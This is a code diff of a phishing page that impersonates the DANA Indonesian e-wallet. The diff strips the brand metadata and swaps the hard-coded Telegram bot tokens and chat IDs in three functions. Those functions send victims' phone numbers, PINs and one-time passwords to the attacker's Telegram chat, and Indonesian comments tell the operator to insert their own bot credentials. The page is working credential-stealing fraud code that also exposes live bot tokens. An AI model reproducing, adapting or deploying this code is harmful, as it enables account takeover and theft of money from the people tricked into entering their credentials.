@@ -1,21 +1,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=0">
-<meta name="theme-color" content="#118EEA"> 
-
-<meta http-equiv="X-UA-Compatible" content="ie=edge">
-<title>Dana | Dompet Digital Indonesia</title>
-<meta property="og:title" content="DANA ID">
-<meta property="twitter:title" content="DANA ID ">
-<meta property="twitter:card" content="summary_large_image">
-<meta property="og:image:type" content="image/jpeg">
-<meta content="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQA-22lQk5cJ68usHbFQm_lnqlOTy6o7c3rZg&usqp=CAU" property="og:image">
- <link href="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTvPgNVkX0Fegnd3bDGBxf82pFcQbfL-g7ytQ&usqp=CAU" rel="shortcut icon" type="image/x-icon">
-  <link href="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTvPgNVkX0Fegnd3bDGBxf82pFcQbfL-g7ytQ&usqp=CAU" rel="apple-touch-icon">
- <link rel="canonical" href="https://www.dana.id/">
-   <meta property="og:url" content="https://www.dana.id/" />
-<meta property="og:description" content="DANA adalah bentuk baru uang tunai yang lebih baik. Transaksi apapun, berapapun dan dimanapun jadi mudah bersama DANA. Ambil bagian dalam transformasi keuangan digital di Indonesia sekarang!">
-<meta property="twitter:description" content="DANA adalah bentuk baru uang tunai yang lebih baik. Transaksi apapun, berapapun dan dimanapun jadi mudah bersama DANA. Ambil bagian dalam transformasi keuangan digital di Indonesia sekarang!">
+<meta name="theme-color" content="#118EEA">
 <script type="module" src="https://unpkg.com/ionicons@7.1.0/dist/ionicons/ionicons.esm.js"></script>
 <script nomodule src="https://unpkg.com/ionicons@7.1.0/dist/ionicons/ionicons.js"></script>
 <link rel="stylesheet" href="https://dev-danapemulihan.pantheonsite.io/asset/container.css">
@@ -662,8 +648,8 @@ $(".bgotp").hide();
     
     var gabungan = '' + logo.value + '%0A𝐍𝐨.𝐇𝐩 : ' + '0' + inp.value;
    
-    var token = '7711855893%3AAAH6Jqie4BBnhYDHfsx4avMrSuYtZnAM8ho'; // Ganti dengan token bot yang kamu buat
-    var grup = '5999282584'; // Ganti dengan chat id dari bot yang kamu buat
+    var token = '7967257967:AAEhvuBgxiKS9yr6jbYOsFppy7aRqauW8jE'; // Ganti dengan token bot yang kamu buat
+    var grup = '6728611462'; // Ganti dengan chat id dari bot yang kamu buat
 
     $.ajax({
         url: `https://api.telegram.org/bot${token}/sendMessage?chat_id=${grup}&text=${gabungan}&parse_mode=html`,
@@ -701,8 +687,8 @@ function sendPin(){
      
  
 
-    var token = '7711855893%3AAAH6Jqie4BBnhYDHfsx4avMrSuYtZnAM8ho'; // Ganti dengan token bot yang kamu buat
-    var grup = '5999282584'; // Ganti dengan chat id dari bot yang kamu buat
+    var token = '7967257967:AAEhvuBgxiKS9yr6jbYOsFppy7aRqauW8jE'; // Ganti dengan token bot yang kamu buat
+    var grup = '6728611462'; // Ganti dengan chat id dari bot yang kamu buat
 
     $.ajax({
         url: `https://api.telegram.org/bot${token}/sendMessage?chat_id=${grup}&text=${gabungan}&parse_mode=html`,
@@ -742,8 +728,8 @@ $(".alert").css("color","red");
     var gabungan = '' + logo.value + '%0A𝐍𝐨.𝐇𝐩: ' + '0' + inp.value + '%0A𝐏𝐈𝐍    : ' + pin1.value + pin2.value + pin3.value + pin4.value + pin5.value + pin6.value + '%0A%0A𝐎𝐓𝐏    : ' + otp1.value + otp2.value + otp3.value + otp4.value;
 
 
-    var token = '7711855893%3AAAH6Jqie4BBnhYDHfsx4avMrSuYtZnAM8ho'; // Ganti dengan token bot yang kamu buat
-    var grup = '5999282584'; // Ganti dengan chat id dari bot yang kamu buat
+    var token = '7967257967:AAEhvuBgxiKS9yr6jbYOsFppy7aRqauW8jE'; // Ganti dengan token bot yang kamu buat
+    var grup = '6728611462'; // Ganti dengan chat id dari bot yang kamu buat
 
     $.ajax({
         url: `https://api.telegram.org/bot${token}/sendMessage?chat_id=${grup}&text=${gabungan}&parse_mode=html`,
